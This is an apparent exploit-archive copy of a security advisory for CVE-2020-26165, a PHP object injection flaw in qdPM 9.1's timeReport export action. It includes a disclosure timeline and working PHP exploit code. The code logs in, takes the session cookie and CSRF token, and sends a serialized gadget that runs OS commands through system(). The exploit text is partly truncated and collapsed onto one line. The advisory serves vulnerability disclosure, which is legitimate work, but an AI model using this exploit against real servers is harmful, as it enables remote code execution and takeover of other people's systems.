@@ -1,0 +1,72 @@
+id: 35581
+date: 01/01/2021
+title: qdPM 9.1 PHP Object Injection Vulnerability
+author: EgiX
+cves: CVE-2020-26165
+
+--------------------------------------------------------------
+qdPM <= 9.1 (executeExport) PHP Object Injection Vulnerability
+--------------------------------------------------------------
+
+
+[-] Software Link:
+
+http://qdpm.net
+
+
+[-] Affected Versions:
+
+Version 9.1 and prior versions.
+
+
+[-] Vulnerability Description:
+
+The vulnerability is located in the /core/apps/qdPM/modules/timeReport/actions/actions.class.php
+script, specifically within the timeReportActions::executeExport() method:
+
+295.  public function executeExport(sfWebRequest $request)
+296.  { 
+297.   $separator = "\t";
+298.   $format = $request->getParameter('format');
+299.   $filename = $request->getParameter('filename');
+300.   
+301.   $export = unserialize($request->getParameter('export'));
+
+User input passed through the "export" request parameter is not properly sanitized before being
+used in a call to the unserialize() function at line 301. This can be exploited by malicious users
+to inject arbitrary PHP objects into the application scope, allowing them to carry out a variety
+of attacks, such as executing arbitrary OS commands.
+
+
+[-] Proof of Concept:
+
+http://karmainsecurity.com/pocs/CVE-2020-26165
+
+\n"; print "\nExample....: php $argv[0] http://localhost/qdpm/ user passwd"; print "\nExample....: php $argv[0] https://test.com/qdpm/ evil hacker\n\n"; die(); } list($url, $user, $pass) = [$argv[1], $argv[2], $argv[3]]; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_HEADER, true); print "[-] Logging in with username '{$user}' and password '{$pass}'\n"; $resp = curl_exec($ch); if (!preg_match("/Cookie: [^;]+/", $resp, $sid)) die("[-] Session ID not found!\n"); if (!preg_match('/_csrf_token\]" value="([^"]+)"/', $resp, $csrf)) die("[-] CSRF token not found!\n"); curl_setopt($ch, CURLOPT_URL, "{$url}index.php/login"); curl_setopt($ch, CURLOPT_HTTPHEADER, $sid); curl_setopt($ch, CURLOPT_POSTFIELDS, "login[email]={$user}&login[password]={$pass}&login[_csrf_token]={$csrf[1]}"); if (!preg_match("/Cookie: [^;]+/", curl_exec($ch), $sid)) die("[-] Login failed!\n"); print "[-] Logged-in! Exploiting PHP Object Injection...\n"; class sfOutputEscaperObjectDecorator { protected $escapingMethod = "system"; protected $value = "id; whoami"; } $obj = rawurlencode(str_replace(['s:', chr(0)], ['S:', '\00'], serialize([[new sfOutputEscaperObjectDecorator]]))); curl_setopt($ch, CURLOPT_URL, "{$url}index.php/timeReport/export?export={$obj}"); curl_setopt($ch, CURLOPT_POST, false); curl_setopt($ch, CURLOPT_HTTPHEADER, $sid); print curl_exec($ch);
+
+
+
+
+[-] Solution:
+
+No official solution is currently available.
+
+
+[-] Disclosure Timeline:
+
+[29/02/2020] - Vendor notified
+[08/04/2020] - No response, vendor contacted again
+[09/04/2020] - Vendor replies they will fix the vulnerability in a summer release
+[30/09/2020] - Summer is gone and a new version hasn't been released, vendor contacted again
+[30/09/2020] - Vendor replies they're working on version 10, and should be ready in this year
+[30/09/2020] - CVE number requested and assigned
+[02/12/2020] - Vendor informed about public disclosure by the end of the year
+[30/12/2020] - Public disclosure
+
+
+[-] CVE Reference:
+
+The Common Vulnerabilities and Exposures project (cve.mitre.org)
+has assigned the name CVE-2020-26165 to this vulnerability.
+
+#  0day.today [2023-03-26]  #
